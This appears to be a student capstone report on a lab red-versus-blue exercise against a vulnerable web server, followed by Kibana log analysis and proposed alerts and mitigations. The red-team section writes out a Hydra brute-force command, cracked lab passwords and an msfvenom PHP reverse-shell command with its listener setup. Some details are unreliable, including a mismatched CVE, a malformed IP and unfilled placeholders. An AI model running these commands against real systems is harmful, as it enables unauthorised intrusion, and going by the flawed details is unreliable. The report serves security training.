# Red Vs. Blue Team Project
Capstone Engagement
Assessment, Analysis, and Hardening of a Vulnerable System

Table of Contents

This document contains the following sections:
01
02
03
04
Network Topology
Red Team: Security Assessment
Blue Team: Log Analysis and Attack Characterization
Hardening: Proposed Alarms and Mitigation Strategies

Network Topology 
3

Network
Address Range: 192.168.1.0/24
Netmask: 255.255.255.0
Gateway: 

Machines
IPv4: 192.168.90
OS: Linux
Hostname: KALI

IPv4: 192.168.1.105
OS: Linux
Hostname: Capstone

IPv4: 192.168.1.100
OS: Linux
Hostname: ELK Stack

IPv4: 192.168.1.1
OS: Windows
Hostname: Hyper-V Azure Machine ML-REFVM-6844247


Network Topology

5
Red Team
Security Assessment


Recon: Describing the Target
Nmap identified the following hosts on the network:
Hostname
IP Address
Role on Network

Hyper-V Azure machine 
ML-RefVm-684427

192.168.1.1

Cloud Based Hosting machine

Kali

192.168.1.90

Attacking Machine (Kali)

ELK Stack

192.168.1.100
Machine hosting a Kibana server and capturing activities on Capstone machine

Capstone

192.168.1.105
The vulnerable Target machine

Vulnerability Assessment
The assessment uncovered the following critical vulnerabilities in the target:
Vulnerability
Description
Impact
Port 80 open to public access
CVE-2019-6579 
Port 80  is open and unsecure which make it susceptible to exploits. Nmap help to find out port 80 was open
Red Team was able to gain access to  the system through port 80 and got access to files, especially the ‘Secret file’
LFI Vulnerability 
LFI allows access into confidential files on a site. 
An LFI vulnerability allows attackers to gain access to sensitive credentials. The attackers may be able to read and/or execute files.
WebDav Vulnerability
Vulnerable WebDav allows easy access to attackers to input files
This gives access to attackers to remotely modify website content. Red Team was able to input a shell
Brute Force Attack using Hydra
Hydra is tool used to gain access to username and passwords
Easy system access by using Bruteforce with common usernames and common password lists such as rockyou.txt

Vulnerability Assessment
The assessment uncovered the following critical vulnerabilities in the target:
Vulnerability
Description
Impact
Unsalted Password Hashes
Hashed passwords that are not salted can be cracked with online tools
Red Team was able to easily crack Ryan’s password hash by using crackstaion.net
Reverse Shell Payload
This payload establishes a shell, or a back door in which the target machine communicates back to the attacking machine
Red team was able to input a shell into the target machine and was able to gain access to the target machine using msfvenom
User information are not confidential
User Credentials not kept safe and in a secure manner and too much information displayed about ashton, Hannah and Ryan on website
Evidence showed that Ashton had Ryan’s password hash stored in his account. This made that attackers job much easier. The information displayed about Ashton gave Red team the hint about secret folder
SSH
Secure Shell is a network communication protocol that enables two computers to communicate
We were able to gain direct access into the system without a shell. We ssh into the network using ashton and Ryan information

Exploitation: [Nmap Scan for Open Port]
Tools & Processes
Nmap was used to scan for open ports
Command: nmap 192.168.1.90/24

Achievements
Nmap scan revealed that port 22/tcp ssh and port 80/tcp http were open
01
02
03
[INSERT: screenshot or command output illustrating the exploit.]

Exploitation: [Brute Force Using Hydra]
Tools & Processes
A brute force was performed on the secret file using Aston’s username since we discovered that he is responsible for managing the file. This was done using Hydra and rockyou.txt wordlist. 

Command: hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder

01
02
Achievements
The red team was able to obtain Ashton’s password with the bruteforce and was able to sign in and gain access to the information in the secret file. This information was very helpful in moving forward with the attack

Username: ashton
Password: leopoldo
03

Exploitation: [LFI Vulnerability]
Tools & Processes
This was done by manipulating the web url path. The red team included ‘secret_file’ name into the url path 
 
Url path: 192.168.1.105/company_folders/secret_file/
01
02
Achievements
This gave the red team access to the secret file and with the help of brute force attack, we got access to all the information in the file
03

Exploitation: [User Credential]
Tools & Processes
While digging through the website, we found information about Ashton, Ryan and Hannah

After gaining access to the secret file we also found Ryan’s password hash and steps to access the WebDav

01
02
Achievements
Ashton’s information on the site led us to the secret file. After accessing the secret file, we saw that Ashton had confidential  information about Ryan. This information helped the Red team move ahead with the attack
03

Exploitation: [Crash the unsalted Hash]
Tools & Processes
Ryan’s password hash was cracked with an online tool 

Tool: crackstaion.net
01
02
Achievements
Since this password was not salted, it was a easy crack online. We will use this to sign into the WebDav folder. Thanks to Ashton

Password: linux4u

03

Exploitation: [WebDav Vulnerability]
Tools & Processes
Using msfvenom, we were able to create a reverse shell file. Since we already gained access to the WebDav, the shell was copied into the folder and executed

WebDave path: dav://192.168.1.105/webdav

msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php
01
02
Achievements
We successfully accessed the WebDav folder and inserted a shell which will allow us to gain remote access control to the network from our kali machine
03

Exploitation: [Reverse Shell Payload]
Tools & Processes
We launched msfvenom,  used the multi/handler exploit., set the payload, set the lhost,  lport and then exploit 

Commands:
o Msfvenom
o Use multi/handler
o Set PAYLOAD php/meterpreter/reverse_tcp
o set LHOST 192.168.1.90 
o set LPORT 4444 
exploit
01
02
Achievements
Going through the process, we were able establish reverse shell connection and gained full access to the network. We browsed around on the network and found the flag
03

Exploitation: [SSH]
Tools & Processes
We noticed ssh port was open during the Nmap scan and we ssh into the network using ashton and Ryan information

01
02
Achievements
We were able to gain direct access into the system without a shell

Blue Team
Log Analysis and Attack Characterization
17

Analysis: Identifying the Port Scan
[Insert Here]
Include a screenshot of Kibana logs depicting the port scan. 
The port scan occurred on Nov 13 around 7:30 - 7:40 pm
183,656 packets were sent from source IP 192.168.1.90
The sudden increase in network traffic  indicates that this was a port scan?

Analysis: Finding the Request for the Hidden Directory
The request occurred about 7:30 - 7:40 pm Nov 13
32,494 requests were made
The secret folder was requested which contains ‘connect to corp server file’ 
They contain ‘connect to corp server file’, which has the details of how to connect to their server

Analysis: Uncovering the Brute Force Attack
32,494 requests were made in the attack?
32,494 requests had been made before the attacker discovered the password, 2 requests out of 32,494 request were successful

Analysis: Finding the WebDAV Connection
[Insert Here]
Add a screenshot of Kibana logs depicting the WebDAV connection.  
58 requests were made to this directory
The shell.php and passwd.dav files were requested

Blue Team
Proposed Alarms and Mitigation Strategies
22

Mitigation: Blocking the Port Scan
We can set an alert that fires when threshold is reached. 


Threshold can be set at ‘greater 5 port scans per minute’
Set server to drop packet traffic when thresholds are exceeded
Enable firewall rules to allow ONLY internal hosts to the server and assign permissions
Make use of Kibana or splunk to monitor traffic and set alerts in order to initiate quick response team 


 


Mitigation: Finding the Request for the Hidden Directory
Create alert anytime a restricted folders or files are accessed by unauthorized users


Threshold for the alert will be ‘greater than 0’
Highly confidential folders/files should be encrypted
Restrict traffic to confidential folders and files  by keeping them on separate and secure servers that are not be accessed by public
Create permissions to restrict internal user access to specific users
Alerts should be sent to appropriate supervisor or manager when there is access to restricted folder
. 


Mitigation: Preventing Brute Force Attacks
Create an alert that triggers after 3 lock outs by each user

Set an alert that is triggered when more than 10 401 error occur within a minute







Increase lockout time after every lockout and after 3 lockouts their accounts would have to be manually unlocked by the IT Department
Limit failed login Attempts to 3 attempts and then lock out
Use of CAPTCHAs on website
Put strict password policy in place. 
Use of Two-Factor Authentication to verify user before login







Mitigation: Detecting the WebDAV Connection
Set an alert that triggers anytime a remote connection is attempted or established
Set an alert that triggers when a php or an exe file is detected in WebDav


   Threshold of alert should be ‘greater
than 0’

Create rule blocking remote access to the WebDav folder
Create rule to block out php and exe files in the WebDav folder
Create firewall rule to block external IPs 







Mitigation: Identifying Reverse Shell Uploads
Set alert for any traffic attempting to access port 4444. Threshold should be set at ‘greater than 0’

 Set alert anytime a file is uploaded from external network







Block port 4444 and other ports that are not needed open 
Set access to WebDav folder to read only for internal users except for authorized users and block all external from read write and execute
Block external IPs  from connecting to the network
